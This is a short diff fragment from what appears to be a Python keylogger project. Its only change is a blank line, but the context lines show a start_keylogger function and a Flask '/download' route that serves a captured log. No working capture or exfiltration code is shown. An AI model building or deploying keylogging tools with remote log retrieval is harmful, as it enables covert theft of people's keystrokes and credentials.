@@ -81,6 +81,7 @@ def start_keylogger():
     return listener
 
 
+
 @app.route('/download', methods=['GET'])
 def download_log():
     try:
